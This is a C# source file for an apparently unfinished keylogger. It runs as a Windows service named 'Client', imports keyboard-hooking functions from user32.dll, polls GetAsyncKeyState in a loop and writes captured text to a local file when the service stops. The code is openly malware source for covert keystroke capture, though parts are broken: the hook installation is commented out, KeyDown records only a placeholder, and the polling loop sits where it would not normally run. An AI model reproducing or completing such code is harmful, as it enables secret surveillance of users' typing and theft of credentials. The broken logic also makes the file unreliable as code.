using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.ServiceProcess;
using System.Timers;
using System.Runtime.InteropServices;
using System.Windows.Input;
using System.Runtime.CompilerServices;

namespace KeyLogger
{
    public partial class Client : ServiceBase
    {
        //Declare the wrapper managed KbDllHookStruct class.
        [StructLayout(LayoutKind.Sequential)]
        public struct KbDllHookStruct
        {
            public int bkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        public delegate int keyboardHookProc(int nCode, IntPtr wParam, ref KbDllHookStruct lparam);

        //This is the Import for the SetWindowsHookEx function.
        //Use this function to install a thread-specific hook.
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc lpfn,
        IntPtr hInstance, uint threadId);

        //This is the Import for the UnhookWindowsHookEx function.
        //Call this function to uninstall the hook.
        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr idHook);

        //This is the Import for the CallNextHookEx function.
        //Use this function to pass the hook information to the next hook procedure in chain.
        [DllImport("user32.dll")]
        public static extern int CallNextHookEx(IntPtr idHook, int nCode,
        IntPtr wParam, ref KbDllHookStruct lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32")]
        public static extern bool GetAsyncKeyState(int vKey);

        private readonly Double _interval = (new TimeSpan(1, 0, 0, 0)).TotalMilliseconds;
        private System.Timers.Timer m_Timer;
        private static IntPtr hook = IntPtr.Zero;
        private const int WH_KEYBOARD_LL = 13;
        private static String pressedKeys = "";

        static void Main()
        {
            System.ServiceProcess.ServiceBase.Run(new Client());

            bool[] oldKeys = new bool[256];
            bool[] newKeys = new bool[256];

            while (true)
            {
                Thread.Sleep(1);

                for (int i = 0; i < newKeys.Length; i++)
                {
                    newKeys[i] = GetAsyncKeyState(i);
                }

                for (int i = 0; i < newKeys.Length; i++)
                {
                    if (newKeys[i] != oldKeys[i] && newKeys[i])
                    {
                        KeyDown(i);
                    }
                    else if (newKeys[i] != oldKeys[i] && !newKeys[i])
                    {
                        KeyUp(i);
                    }
                }

                for (int i = 0; i < newKeys.Length; i++)
                {
                    oldKeys[i] = newKeys[i];
                }
            }
        }

        public Client()
        {
            InitializeLifetimeService();
            Init();
            
            this.ServiceName = "Client";
            this.CanStop = true;
            this.CanPauseAndContinue = false;
            this.AutoLog = true;
        }

        private void Init()
        {
            m_Timer = new System.Timers.Timer();
            m_Timer.BeginInit();
            m_Timer.AutoReset = false;
            m_Timer.Enabled = true;
            m_Timer.Interval = 1000.0;
            m_Timer.Elapsed += m_Timer_Elapsed;
            m_Timer.EndInit();
        }

        private void m_Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            //TODO WORK WORK WORK
            RestartTimer();
        }

        private void RestartTimer()
        {
            m_Timer.Interval = _interval;
            m_Timer.Start();
        }

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            Start();
        }

        protected override void OnStop()
        {
            Stop();
            base.OnStop();
        }

        public void Start()
        {
            m_Timer.Start();

            //IntPtr hInstance = LoadLibrary("User32");
            //hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookProc, hInstance, 0);

            //if (hook == IntPtr.Zero)
            //{
            //    pressedKeys += "SetWindowsHookEx failed";
            //}
            //else
            //{
            //    pressedKeys += "SetWindowsHookEx succeeded";
            //}
        }

        static void KeyDown(int vKey)
        {
            pressedKeys += " PressedKey";
        }

        static void KeyUp(int vKey)
        {

        }

        public new void Stop()
        {
            UnhookWindowsHookEx(hook);

            System.IO.StreamWriter file = new System.IO.StreamWriter("C:/Users/vmadmin/Documents/derp.txt", true);
            file.WriteLine(pressedKeys);
            file.Close();

            m_Timer.Stop();
        }

        public int KeyHookProc(int nCode, IntPtr wParam, ref KbDllHookStruct lParam)
        {
            pressedKeys = "PressedKey";

            if (nCode < 0)
            {
                pressedKeys += "NOPE, ";
                return CallNextHookEx(hook, nCode, wParam, ref lParam);
            }

            pressedKeys += "hi";

            return CallNextHookEx(hook, nCode, wParam, ref lParam);
        }
    }
}
